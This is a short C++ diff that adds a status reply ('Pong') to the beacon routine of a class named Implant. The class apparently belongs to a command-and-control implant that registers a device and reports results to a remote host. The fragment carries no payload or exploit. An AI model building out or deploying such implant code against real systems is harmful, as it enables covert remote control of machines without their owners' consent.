@@ -32,6 +32,8 @@ Implant::Implant(std::string host, std::string port)
 
 void Implant::beacon() {
     api->register_device(id, "frogy");
+
+    api->send_result(std::make_unique<Result>(id, "Pong", 1));
 }
 
 void Implant::set_running(bool isRunning)
